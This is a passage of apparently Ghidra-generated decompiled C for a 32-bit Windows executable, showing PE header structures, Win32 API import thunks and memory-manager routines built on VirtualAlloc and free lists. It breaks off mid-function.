typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_THUNK_DATA32 IMAGE_THUNK_DATA32, *PIMAGE_THUNK_DATA32;

struct IMAGE_THUNK_DATA32 {
    dword StartAddressOfRawData;
    dword EndAddressOfRawData;
    dword AddressOfIndex;
    dword AddressOfCallBacks;
    dword SizeOfZeroFill;
    dword Characteristics;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_22 IMAGE_RESOURCE_DIR_STRING_U_22, *PIMAGE_RESOURCE_DIR_STRING_U_22;

struct IMAGE_RESOURCE_DIR_STRING_U_22 {
    word Length;
    wchar16 NameString[11];
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_12 IMAGE_RESOURCE_DIR_STRING_U_12, *PIMAGE_RESOURCE_DIR_STRING_U_12;

struct IMAGE_RESOURCE_DIR_STRING_U_12 {
    word Length;
    wchar16 NameString[6];
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef char *va_list;




BOOL __stdcall CloseHandle(HANDLE hObject)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401160. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = CloseHandle(hObject);
  return BVar1;
}



HANDLE __stdcall
CreateFileA(LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,
           LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,
           DWORD dwFlagsAndAttributes,HANDLE hTemplateFile)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401168. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = CreateFileA(lpFileName,dwDesiredAccess,dwShareMode,lpSecurityAttributes,
                       dwCreationDisposition,dwFlagsAndAttributes,hTemplateFile);
  return pvVar1;
}



DWORD __stdcall GetFileType(HANDLE hFile)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401170. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileType(hFile);
  return DVar1;
}



DWORD __stdcall GetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401178. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetFileSize(hFile,lpFileSizeHigh);
  return DVar1;
}



HANDLE __stdcall GetStdHandle(DWORD nStdHandle)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401180. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = GetStdHandle(nStdHandle);
  return pvVar1;
}



BOOL __stdcall MoveFileA(LPCSTR lpExistingFileName,LPCSTR lpNewFileName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401188. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = MoveFileA(lpExistingFileName,lpNewFileName);
  return BVar1;
}



BOOL __stdcall
ReadFile(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401198. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = ReadFile(hFile,lpBuffer,nNumberOfBytesToRead,lpNumberOfBytesRead,lpOverlapped);
  return BVar1;
}



BOOL __stdcall SetEndOfFile(HANDLE hFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011a8. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetEndOfFile(hFile);
  return BVar1;
}



DWORD __stdcall
SetFilePointer(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011b0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = SetFilePointer(hFile,lDistanceToMove,lpDistanceToMoveHigh,dwMoveMethod);
  return DVar1;
}



LONG __stdcall UnhandledExceptionFilter(_EXCEPTION_POINTERS *ExceptionInfo)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011b8. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = UnhandledExceptionFilter(ExceptionInfo);
  return LVar1;
}



BOOL __stdcall
WriteFile(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,
         LPOVERLAPPED lpOverlapped)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011c0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = WriteFile(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);
  return BVar1;
}



LPSTR __stdcall CharNextA(LPCSTR lpsz)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011c8. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = CharNextA(lpsz);
  return pCVar1;
}



void __stdcall ExitProcess(UINT uExitCode)

{
                    // WARNING: Could not recover jumptable at 0x004011d0. Too many branches
                    // WARNING: Subroutine does not return
                    // WARNING: Treating indirect jump as call
  ExitProcess(uExitCode);
  return;
}



int __stdcall MessageBoxA(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011d8. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MessageBoxA(hWnd,lpText,lpCaption,uType);
  return iVar1;
}



BOOL __stdcall FindClose(HANDLE hFindFile)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011e0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FindClose(hFindFile);
  return BVar1;
}



HANDLE __stdcall FindFirstFileA(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)

{
  HANDLE pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011e8. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
  return pvVar1;
}



BOOL __stdcall FreeLibrary(HMODULE hLibModule)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011f0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = FreeLibrary(hLibModule);
  return BVar1;
}



LPSTR __stdcall GetCommandLineA(void)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x004011f8. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = GetCommandLineA();
  return pCVar1;
}



DWORD __stdcall GetCurrentDirectoryA(DWORD nBufferLength,LPSTR lpBuffer)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401200. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentDirectoryA(nBufferLength,lpBuffer);
  return DVar1;
}



DWORD __stdcall GetLastError(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401208. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetLastError();
  return DVar1;
}



int __stdcall GetLocaleInfoA(LCID Locale,LCTYPE LCType,LPSTR lpLCData,int cchData)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401210. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = GetLocaleInfoA(Locale,LCType,lpLCData,cchData);
  return iVar1;
}



DWORD __stdcall GetModuleFileNameA(HMODULE hModule,LPSTR lpFilename,DWORD nSize)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401218. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetModuleFileNameA(hModule,lpFilename,nSize);
  return DVar1;
}



HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401220. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = GetModuleHandleA(lpModuleName);
  return pHVar1;
}



FARPROC __stdcall GetProcAddress(HMODULE hModule,LPCSTR lpProcName)

{
  FARPROC pFVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401228. Too many branches
                    // WARNING: Treating indirect jump as call
  pFVar1 = GetProcAddress(hModule,lpProcName);
  return pFVar1;
}



void __stdcall GetStartupInfoA(LPSTARTUPINFOA lpStartupInfo)

{
                    // WARNING: Could not recover jumptable at 0x00401230. Too many branches
                    // WARNING: Treating indirect jump as call
  GetStartupInfoA(lpStartupInfo);
  return;
}



LCID __stdcall GetThreadLocale(void)

{
  LCID LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401238. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = GetThreadLocale();
  return LVar1;
}



HMODULE __stdcall LoadLibraryExA(LPCSTR lpLibFileName,HANDLE hFile,DWORD dwFlags)

{
  HMODULE pHVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401240. Too many branches
                    // WARNING: Treating indirect jump as call
  pHVar1 = LoadLibraryExA(lpLibFileName,hFile,dwFlags);
  return pHVar1;
}



int __stdcall LoadStringA(HINSTANCE hInstance,UINT uID,LPSTR lpBuffer,int cchBufferMax)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401248. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = LoadStringA(hInstance,uID,lpBuffer,cchBufferMax);
  return iVar1;
}



LPSTR __stdcall lstrcpynA(LPSTR lpString1,LPCSTR lpString2,int iMaxLength)

{
  LPSTR pCVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401250. Too many branches
                    // WARNING: Treating indirect jump as call
  pCVar1 = lstrcpynA(lpString1,lpString2,iMaxLength);
  return pCVar1;
}



int __stdcall lstrlenA(LPCSTR lpString)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401258. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = lstrlenA(lpString);
  return iVar1;
}



int __stdcall
MultiByteToWideChar(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cbMultiByte,
                   LPWSTR lpWideCharStr,int cchWideChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401260. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = MultiByteToWideChar(CodePage,dwFlags,lpMultiByteStr,cbMultiByte,lpWideCharStr,cchWideChar)
  ;
  return iVar1;
}



LSTATUS __stdcall RegCloseKey(HKEY hKey)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401268. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegCloseKey(hKey);
  return LVar1;
}



LSTATUS __stdcall
RegOpenKeyExA(HKEY hKey,LPCSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401270. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegOpenKeyExA(hKey,lpSubKey,ulOptions,samDesired,phkResult);
  return LVar1;
}



LSTATUS __stdcall
RegQueryValueExA(HKEY hKey,LPCSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,
                LPDWORD lpcbData)

{
  LSTATUS LVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401278. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = RegQueryValueExA(hKey,lpValueName,lpReserved,lpType,lpData,lpcbData);
  return LVar1;
}



BOOL __stdcall SetCurrentDirectoryA(LPCSTR lpPathName)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401280. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = SetCurrentDirectoryA(lpPathName);
  return BVar1;
}



int __stdcall
WideCharToMultiByte(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,
                   LPSTR lpMultiByteStr,int cbMultiByte,LPCSTR lpDefaultChar,
                   LPBOOL lpUsedDefaultChar)

{
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401288. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = WideCharToMultiByte(CodePage,dwFlags,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,
                              lpDefaultChar,lpUsedDefaultChar);
  return iVar1;
}



SIZE_T __stdcall VirtualQuery(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)

{
  SIZE_T SVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401290. Too many branches
                    // WARNING: Treating indirect jump as call
  SVar1 = VirtualQuery(lpAddress,lpBuffer,dwLength);
  return SVar1;
}



BSTR __stdcall SysAllocStringLen(OLECHAR *strIn,UINT ui)

{
  BSTR pOVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401298. Too many branches
                    // WARNING: Treating indirect jump as call
  pOVar1 = SysAllocStringLen(strIn,ui);
  return pOVar1;
}



INT __stdcall SysReAllocStringLen(BSTR *pbstr,OLECHAR *psz,uint len)

{
  INT IVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012a0. Too many branches
                    // WARNING: Treating indirect jump as call
  IVar1 = SysReAllocStringLen(pbstr,psz,len);
  return IVar1;
}



void __stdcall SysFreeString(BSTR bstrString)

{
                    // WARNING: Could not recover jumptable at 0x004012a8. Too many branches
                    // WARNING: Treating indirect jump as call
  SysFreeString(bstrString);
  return;
}



LONG __stdcall InterlockedIncrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012b0. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedIncrement(lpAddend);
  return LVar1;
}



LONG __stdcall InterlockedDecrement(LONG *lpAddend)

{
  LONG LVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012b8. Too many branches
                    // WARNING: Treating indirect jump as call
  LVar1 = InterlockedDecrement(lpAddend);
  return LVar1;
}



DWORD __stdcall GetCurrentThreadId(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012c0. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetCurrentThreadId();
  return DVar1;
}



DWORD __stdcall GetVersion(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012c8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetVersion();
  return DVar1;
}



BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012d0. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = QueryPerformanceCounter(lpPerformanceCount);
  return BVar1;
}



DWORD __stdcall GetTickCount(void)

{
  DWORD DVar1;
  
                    // WARNING: Could not recover jumptable at 0x004012d8. Too many branches
                    // WARNING: Treating indirect jump as call
  DVar1 = GetTickCount();
  return DVar1;
}



WORD FUN_004012e0(void)

{
  WORD WVar1;
  undefined auStack_48 [48];
  WORD local_18;
  
  GetStartupInfoA((LPSTARTUPINFOA)auStack_48);
  WVar1 = 10;
  if ((auStack_48[44] & 1) != 0) {
    WVar1 = local_18;
  }
  return WVar1;
}



HLOCAL __stdcall LocalAlloc(UINT uFlags,SIZE_T uBytes)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401304. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalAlloc(uFlags,uBytes);
  return pvVar1;
}



HLOCAL __stdcall LocalFree(HLOCAL hMem)

{
  HLOCAL pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040130c. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = LocalFree(hMem);
  return pvVar1;
}



LPVOID __stdcall VirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect)

{
  LPVOID pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00401314. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = VirtualAlloc(lpAddress,dwSize,flAllocationType,flProtect);
  return pvVar1;
}



BOOL __stdcall VirtualFree(LPVOID lpAddress,SIZE_T dwSize,DWORD dwFreeType)

{
  BOOL BVar1;
  
                    // WARNING: Could not recover jumptable at 0x0040131c. Too many branches
                    // WARNING: Treating indirect jump as call
  BVar1 = VirtualFree(lpAddress,dwSize,dwFreeType);
  return BVar1;
}



void __stdcall InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00401324. Too many branches
                    // WARNING: Treating indirect jump as call
  InitializeCriticalSection(lpCriticalSection);
  return;
}



void __stdcall EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x0040132c. Too many branches
                    // WARNING: Treating indirect jump as call
  EnterCriticalSection(lpCriticalSection);
  return;
}



void __stdcall LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x00401334. Too many branches
                    // WARNING: Treating indirect jump as call
  LeaveCriticalSection(lpCriticalSection);
  return;
}



void __stdcall DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection)

{
                    // WARNING: Could not recover jumptable at 0x0040133c. Too many branches
                    // WARNING: Treating indirect jump as call
  DeleteCriticalSection(lpCriticalSection);
  return;
}



int * FUN_00401344(void)

{
  int **ppiVar1;
  undefined4 *puVar2;
  int *piVar3;
  int iVar4;
  
  if (DAT_004195e0 == (int **)0x0) {
    puVar2 = (undefined4 *)LocalAlloc(0,0x644);
    if (puVar2 == (undefined4 *)0x0) {
      return (int *)0x0;
    }
    *puVar2 = DAT_004195dc;
    iVar4 = 0;
    DAT_004195dc = puVar2;
    do {
      ppiVar1 = (int **)(puVar2 + iVar4 * 4 + 1);
      *ppiVar1 = (int *)DAT_004195e0;
      iVar4 = iVar4 + 1;
      DAT_004195e0 = ppiVar1;
    } while (iVar4 != 100);
  }
  piVar3 = (int *)DAT_004195e0;
  DAT_004195e0 = (int **)*DAT_004195e0;
  return piVar3;
}



void FUN_00401394(int param_1)

{
  *(int *)param_1 = param_1;
  *(int *)(param_1 + 4) = param_1;
  return;
}



undefined4 FUN_0040139c(int **param_1,int **param_2)

{
  int *piVar1;
  int **ppiVar2;
  
  ppiVar2 = (int **)FUN_00401344();
  if (ppiVar2 == (int **)0x0) {
    return 0;
  }
  ppiVar2[2] = *param_2;
  ppiVar2[3] = param_2[1];
  piVar1 = *param_1;
  *ppiVar2 = piVar1;
  ppiVar2[1] = (int *)param_1;
  piVar1[1] = (int)ppiVar2;
  *param_1 = (int *)ppiVar2;
  return CONCAT31((int3)((uint)ppiVar2 >> 8),1);
}



void FUN_004013cc(int *param_1)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)param_1[1];
  iVar2 = *param_1;
  *piVar1 = iVar2;
  *(int **)(iVar2 + 4) = piVar1;
  *param_1 = (int)DAT_004195e0;
  DAT_004195e0 = param_1;
  return;
}



void FUN_004013e4(int **param_1,int **param_2,int **param_3)

{
  int **ppiVar1;
  undefined4 uVar2;
  int **ppiVar3;
  
  ppiVar3 = (int **)*param_1;
  *param_3 = *param_2;
  param_3[1] = param_2[1];
  do {
    ppiVar1 = (int **)*ppiVar3;
    if (*param_3 == (int *)((int)ppiVar3[2] + (int)ppiVar3[3])) {
      FUN_004013cc((int *)ppiVar3);
      *param_3 = ppiVar3[2];
      param_3[1] = (int *)((int)param_3[1] + (int)ppiVar3[3]);
    }
    else if ((int *)((int)*param_3 + (int)param_3[1]) == ppiVar3[2]) {
      FUN_004013cc((int *)ppiVar3);
      param_3[1] = (int *)((int)param_3[1] + (int)ppiVar3[3]);
    }
    ppiVar3 = ppiVar1;
  } while (param_1 != ppiVar1);
  uVar2 = FUN_0040139c(param_1,param_3);
  if ((char)uVar2 == '\0') {
    *param_3 = (int *)0x0;
  }
  return;
}



undefined4 FUN_00401454(int **param_1,int **param_2)

{
  int *piVar1;
  int *piVar2;
  int **ppiVar3;
  int *local_18;
  int local_14;
  
  ppiVar3 = param_1;
  while( true ) {
    piVar1 = *param_2;
    piVar2 = ppiVar3[2];
    if ((piVar2 <= piVar1) &&
       ((uint)((int)piVar1 + (int)param_2[1]) <= (uint)((int)piVar2 + (int)ppiVar3[3]))) break;
    ppiVar3 = (int **)*ppiVar3;
    if (param_1 == ppiVar3) {
      return 0;
    }
  }
  if (piVar1 == piVar2) {
    ppiVar3[2] = (int *)((int)ppiVar3[2] + (int)param_2[1]);
    piVar2 = param_2[1];
    ppiVar3[3] = (int *)((int)ppiVar3[3] - (int)piVar2);
    if (ppiVar3[3] == (int *)0x0) {
      piVar2 = (int *)FUN_004013cc((int *)ppiVar3);
    }
  }
  else if ((int)piVar1 + (int)param_2[1] == (int)piVar2 + (int)ppiVar3[3]) {
    ppiVar3[3] = (int *)((int)ppiVar3[3] - (int)param_2[1]);
  }
  else {
    local_18 = (int *)((int)*param_2 + (int)param_2[1]);
    local_14 = ((int)ppiVar3[2] + (int)ppiVar3[3]) - (int)local_18;
    ppiVar3[3] = (int *)((int)piVar1 - (int)piVar2);
    piVar2 = (int *)FUN_0040139c(ppiVar3,&local_18);
    if ((char)piVar2 == '\0') {
      return 0;
    }
  }
  return CONCAT31((int3)((uint)piVar2 >> 8),1);
}



void FUN_004014e8(int param_1,int **param_2)

{
  undefined4 uVar1;
  int *piVar2;
  
  if (param_1 < 0x100000) {
    piVar2 = (int *)0x100000;
  }
  else {
    piVar2 = (int *)(param_1 + 0xffffU & 0xffff0000);
  }
  param_2[1] = piVar2;
  piVar2 = (int *)VirtualAlloc((LPVOID)0x0,(SIZE_T)piVar2,0x2000,1);
  *param_2 = piVar2;
  if (piVar2 != (int *)0x0) {
    uVar1 = FUN_0040139c((int **)&DAT_004195e4,param_2);
    if ((char)uVar1 == '\0') {
      VirtualFree(*param_2,0,0x8000);
      *param_2 = (int *)0x0;
    }
  }
  return;
}



void FUN_0040154c(LPVOID param_1,int param_2,int **param_3)

{
  int *piVar1;
  undefined4 uVar2;
  
  param_3[1] = (int *)0x100000;
  piVar1 = (int *)VirtualAlloc(param_1,0x100000,0x2000,4);
  *param_3 = piVar1;
  if (piVar1 == (int *)0x0) {
    piVar1 = (int *)(param_2 + 0xffffU & 0xffff0000);
    param_3[1] = piVar1;
    piVar1 = (int *)VirtualAlloc(param_1,(SIZE_T)piVar1,0x2000,4);
    *param_3 = piVar1;
  }
  if (*param_3 != (int *)0x0) {
    uVar2 = FUN_0040139c((int **)&DAT_004195e4,param_3);
    if ((char)uVar2 == '\0') {
      VirtualFree(*param_3,0,0x8000);
      *param_3 = (int *)0x0;
    }
  }
  return;
}



void FUN_004015c4(LPVOID param_1,int param_2,LPVOID *param_3)

{
  int **ppiVar1;
  LPVOID lpAddress;
  BOOL BVar2;
  int **ppiVar3;
  LPVOID local_1c;
  uint local_18;
  
  local_1c = (LPVOID)0xffffffff;
  local_18 = 0;
  ppiVar1 = (int **)DAT_004195e4;
  while (ppiVar3 = ppiVar1, ppiVar3 != &DAT_004195e4) {
    ppiVar1 = (int **)*ppiVar3;
    lpAddress = ppiVar3[2];
    if ((param_1 <= lpAddress) &&
       ((uint)((int)lpAddress + (int)ppiVar3[3]) <= (uint)(param_2 + (int)param_1))) {
      if (lpAddress < local_1c) {
        local_1c = lpAddress;
      }
      if (local_18 < (uint)((int)lpAddress + (int)ppiVar3[3])) {
        local_18 = (int)lpAddress + (int)ppiVar3[3];
      }
      BVar2 = VirtualFree(lpAddress,0,0x8000);
      if (BVar2 == 0) {
        DAT_004195c0 = 1;
      }
      FUN_004013cc((int *)ppiVar3);
    }
  }
  *param_3 = (LPVOID)0x0;
  if (local_18 != 0) {
    *param_3 = local_1c;
    param_3[1] = (LPVOID)(local_18 - (int)local_1c);
  }
  return;
}



void FUN_0040167c(uint param_1,int param_2,LPVOID *param_3)

{
  LPVOID pvVar1;
  LPVOID pvVar2;
  LPVOID lpAddress;
  LPVOID pvVar3;
  undefined4 *puVar4;
  LPVOID pvVar5;
  
  pvVar3 = (LPVOID)(param_1 & 0xfffff000);
  pvVar2 = (LPVOID)(param_1 + param_2 + 0xfff & 0xfffff000);
  *param_3 = pvVar3;
  param_3[1] = (LPVOID)((int)pvVar2 - (int)pvVar3);
  puVar4 = DAT_004195e4;
  while( true ) {
    if ((undefined4 **)puVar4 == &DAT_004195e4) {
      return;
    }
    pvVar1 = (LPVOID)puVar4[2];
    lpAddress = pvVar1;
    if (pvVar1 < pvVar3) {
      lpAddress = pvVar3;
    }
    pvVar5 = (LPVOID)(puVar4[3] + (int)pvVar1);
    if (pvVar2 < (LPVOID)(puVar4[3] + (int)pvVar1)) {
      pvVar5 = pvVar2;
